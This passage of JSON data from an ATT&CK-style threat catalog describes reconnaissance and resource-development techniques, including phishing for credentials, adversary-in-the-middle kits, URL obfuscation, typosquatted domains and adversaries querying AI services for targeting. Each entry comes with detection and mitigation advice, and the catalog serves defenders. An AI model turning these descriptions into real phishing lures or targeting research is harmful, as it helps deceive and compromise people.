information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners. <a href=\"https://shodan.io\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Shodan)</a>\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]}]},{"id":"T1597","name":"Search Closed Sources","description":"Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets. <a href=\"https://www.zdnet.com/article/a-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ZDNET Selling Data)</a>\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[{"id":"T1597.001","name":"Threat Intel Vendors","description":"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures. <a href=\"https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: D3Secutrity CTI Feeds)</a>\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. If a threat actor is searching for information on their own activities, that falls under Search Threat Vendor Data. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1597.002","name":"Purchase Technical Data","description":"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure. <a href=\"https://www.zdnet.com/article/a-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ZDNET Selling Data)</a> Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]}]},{"id":"T1598","name":"Phishing for Information","description":"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means. <a href=\"https://threatpost.com/facebook-launching-pad-phishing-attacks/160351/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatPost Social Media Phishing)</a> <a href=\"https://www.trendmicro.com/en_us/research/20/i/tricky-forms-of-phishing.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMictro Phishing)</a> <a href=\"https://www.pcmag.com/news/hackers-try-to-phish-united-nations-staffers-with-fake-login-pages\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PCMag FakeLogin)</a> <a href=\"https://nakedsecurity.sophos.com/2020/10/02/serious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Attachment)</a> <a href=\"https://github.com/ryhanson/phishery\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Phishery)</a> Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information. <a href=\"https://www.avertium.com/resources/threat-reports/everything-you-need-to-know-about-callback-phishing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Avertium callback phishing)</a>\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by Email Spoofing <a href=\"https://www.proofpoint.com/us/threat-reference/email-spoofing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint-spoof)</a> the identity of the sender, which can be used to fool both the human recipient as well as automated security tools. <a href=\"https://blog.cyberproof.com/blog/double-bounced-attacks-with-email-spoofing-2022-trends\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cyberproof-double-bounce)</a> \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). <a href=\"https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft OAuth Spam 2022)</a> <a href=\"https://unit42.paloaltonetworks.com/examining-vba-initiated-infostealer-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 VBA Infostealer 2014)</a>","detection":"Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>\n\nWhen it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.\n\nMonitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content","Application Log: Application Log Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and spearphishing attempts."},{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>"}],"subTechniques":[{"id":"T1598.001","name":"Spearphishing Service","description":"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. <a href=\"https://threatpost.com/facebook-launching-pad-phishing-attacks/160351/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatPost Social Media Phishing)</a> These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.","detection":"Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Application Log: Application Log Content","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and spearphishing attempts."}]},{"id":"T1598.002","name":"Spearphishing Attachment","description":"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file. <a href=\"https://nakedsecurity.sophos.com/2020/10/02/serious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Attachment)</a> <a href=\"https://github.com/ryhanson/phishery\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Phishery)</a> The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such as HTML Smuggling to harvest user credentials via fake login portals. <a href=\"https://www.huntress.com/blog/smugglers-gambit-uncovering-html-smuggling-adversary-in-the-middle-tradecraft\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Huntress HTML Smuggling 2024)</a>\n\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.","detection":"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Flow","Application Log: Application Log Content","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and spearphishing attempts."},{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>"}]},{"id":"T1598.003","name":"Spearphishing Link","description":"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. <a href=\"https://www.trendmicro.com/en_us/research/20/i/tricky-forms-of-phishing.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMictro Phishing)</a> <a href=\"https://www.pcmag.com/news/hackers-try-to-phish-united-nations-staffers-with-fake-login-pages\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PCMag FakeLogin)</a> The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, <code>hxxp://google.com@1157586937</code>. <a href=\"https://www.mandiant.com/resources/blog/url-obfuscation-schema-abuse\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant URL Obfuscation 2023)</a>\n\nAdversaries may also embed “tracking pixels,” \"web bugs,\" or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address. <a href=\"https://csrc.nist.gov/glossary/term/web_bug\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST Web Bug)</a> <a href=\"https://en.ryte.com/wiki/Tracking_Pixel\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ryte Wiki)</a> These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. <a href=\"https://en.ryte.com/wiki/Tracking_Pixel\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ryte Wiki)</a> <a href=\"https://iapp.org/resources/article/web-beacon/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IAPP)</a>\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods. <a href=\"https://www.zscaler.com/blogs/security-research/fake-sites-stealing-steam-credentials\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ZScaler BitB 2020)</a> <a href=\"https://mrd0x.com/browser-in-the-browser-phishing-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mr. D0x BitB 2022)</a>\n\nAdversaries can use phishing kits such as <code>EvilProxy</code> and <code>Evilginx2</code> to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie. <a href=\"https://www.proofpoint.com/sites/default/files/threat-reports/pfpt-us-tr-human-factor-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint Human Factor)</a>\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing”). These links may direct a victim to a credential phishing page. <a href=\"https://therecord.media/phishing-campaign-used-qr-codes-to-target-energy-firm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: QR-campaign-energy-firm)</a> By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. <a href=\"https://www.proofpoint.com/us/blog/email-and-cloud-threats/cybersecurity-stop-month-qr-code-phishing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: qr-phish-agriculture)</a> These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e., Phishing), which may be less secure in several relevant ways. <a href=\"https://www.proofpoint.com/us/blog/email-and-cloud-threats/cybersecurity-stop-month-qr-code-phishing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: qr-phish-agriculture)</a> For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.","detection":"Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>\n\nMonitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.","platforms":["PRE"],"dataSources":["Application Log: Application Log Content","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and spearphishing attempts. Additionally, users may perform visual checks of the domains they visit; however, homographs in ASCII and in IDN domains and URL schema obfuscation may render manual checks difficult. Phishing training and other cybersecurity training may raise awareness to check URLs before visiting the sites."},{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>\n\nFurthermore, policies may enforce / install browser extensions that protect against IDN and homograph attacks. Browser password managers may also be configured to only populate credential fields when the URL matches that of the original, legitimate site."}]},{"id":"T1598.004","name":"Spearphishing Voice","description":"Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff. <a href=\"https://business.bofa.com/en-us/content/what-is-vishing.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BOA Telephone Scams)</a>\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information. <a href=\"https://www.avertium.com/resources/threat-reports/everything-you-need-to-know-about-callback-phishing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Avertium callback phishing)</a>\n\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.","detection":"","platforms":["PRE"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify and report social engineering techniques and spearphishing attempts, while also being suspicious of and verifying the identify of callers. <a href=\"https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA Phishing)</a>"}]}]},{"id":"T1681","name":"Search Threat Vendor Data","description":"Threat actors may seek information/indicators from closed or open threat intelligence sources gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. These reports may include descriptions of behavior, detailed breakdowns of attacks, atomic indicators such as malware hashes or IP addresses, timelines of a group’s activity, and more. Adversaries may change their behavior when planning their future operations. \n\nAdversaries have been observed replacing atomic indicators mentioned in blog posts in under a week. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)</a> Adversaries have also been seen searching for their own domain names in threat vendor data and then taking them down, likely to avoid seizure or further investigation. <a href=\"https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sentinel One Contagious Interview ClickFix September 2025)</a>\n\nThis technique is distinct from Threat Intel Vendors in that it describes threat actors performing reconnaissance on their own activity, not in search of victim information.","detection":"","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on designing defenses that are not reliant on atomic indicators."}],"subTechniques":[]},{"id":"T1682","name":"Query Public AI Services","description":"Adversaries may query publicly accessible artificial intelligence (AI) services, such as large language models (LLMs), to support targeting and operations. In addition to searching websites or databases directly (i.e., Search Open Websites/Domains), adversaries may use AI services to synthesize, aggregate, and analyze publicly available information at scale. This may include identifying individuals or organizations to target, researching organizational structures and personnel, identifying technologies used by target organizations, researching business relationships to develop plausible pretexts for Social Engineering approaches, identifying contact information for use in Phishing or Phishing for Information, or gathering derogatory or sensitive information about individuals that may be used for extortion or coercion. <a href=\"https://www.microsoft.com/en-us/security/blog/2024/02/14/staying-ahead-of-threat-actors-in-the-age-of-ai/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSFT-AI)</a> <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTIG AI Threat Tracker)</a>\n\nInformation gathered through AI services may be leveraged for other behaviors, such as establishing operational resources (i.e., Generate Content or Establish Accounts. For obtaining access to AI tools and services, see Artificial Intelligence.","detection":"","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on designing defenses that are not reliant on atomic indicators."}],"subTechniques":[]}]},{"tactic":"Resource Development","techniques":[{"id":"T1583","name":"Acquire Infrastructure","description":"Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. <a href=\"https://documents.trendmicro.com/assets/wp/wp-criminal-hideouts-for-lease.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendmicroHideoutsLease)</a> Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost. <a href=\"https://unit42.paloaltonetworks.com/purpleurchin-steals-cloud-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Trial PurpleUrchin)</a> Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy, including from residential proxy services. <a href=\"https://www.amnesty.org/en/latest/research/2021/07/forensic-methodology-report-how-to-catch-nso-groups-pegasus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: amnesty_nso_pegasus)</a> <a href=\"https://www.ic3.gov/Media/News/2022/220818.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI Proxies Credential Stuffing)</a> <a href=\"https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Microsoft 365 2022)</a> Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.","detection":"Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. \n\nOnce adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://www.mandiant.com/resources/scandalous-external-detection-using-network-scan-data-and-automation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant SCANdalous Jul 2020)</a> <a href=\"https://michaelkoczwara.medium.com/cobalt-strike-c2-hunting-with-shodan-c448d501a6e2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Koczwara Beacon Hunting Sep 2021)</a>\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":["PRE"],"dataSources":["Internet Scan: Response Metadata","Internet Scan: Response Content","Domain Name: Active DNS","Domain Name: Passive DNS","Domain Name: Domain Registration"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[{"id":"T1583.001","name":"Domains","description":"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. <a href=\"https://us-cert.cisa.gov/ncas/alerts/aa20-258a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MSS Sep 2020)</a> Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). <a href=\"https://web.archive.org/web/20151022204649/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT28)</a> <a href=\"https://www.zdnet.com/article/paypal-alert-beware-the-paypai-scam-5000109103/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PaypalScam)</a> Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines. <a href=\"https://us-cert.cisa.gov/ncas/tips/ST05-016\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA IDN ST05-016)</a> <a href=\"https://blog.talosintelligence.com/2022/03/transparent-tribe-new-campaign.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: tt_httrack_fake_domains)</a> <a href=\"https://blog.talosintelligence.com/2021/05/transparent-tribe-infra-and-targeting.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: tt_obliqueRAT)</a> <a href=\"https://web.archive.org/web/20220527112908/https://www.riskiq.com/blog/labs/ukraine-malware-infrastructure/\" target=\"_blank\" 